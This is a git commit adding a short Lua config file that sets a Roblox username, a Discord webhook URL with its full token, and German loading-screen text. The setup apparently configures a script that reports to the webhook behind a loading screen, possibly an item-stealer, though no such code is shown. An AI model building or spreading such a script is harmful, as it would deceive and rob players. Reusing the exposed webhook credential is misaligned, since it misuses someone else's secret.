53187d808d2850f64b6c5da16b121111e1fa16d9
ekinoo200 <130805551+ekinoo200@users.noreply.github.com>
2023-04-15 20:01:54 +0200

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,5 @@
+_G.UserName = "ekinakbltabi11"      -- Put ur roblox username here
+
+_G.Webhook = "https://discord.com/api/webhooks/1096842202107359252/rDTG9BpvCJUVFmBrYlByMCRJba2CMqBrYESVg4kYBFcHwwkjLYRPbt4JMWqxVMqr5V2e"       -- replace hook with discord webhook
+
+_G.loadingScreenText = "der script wird geladen wir bitten Sie um Geduld, Danke!"   -- replace text with ur script name 
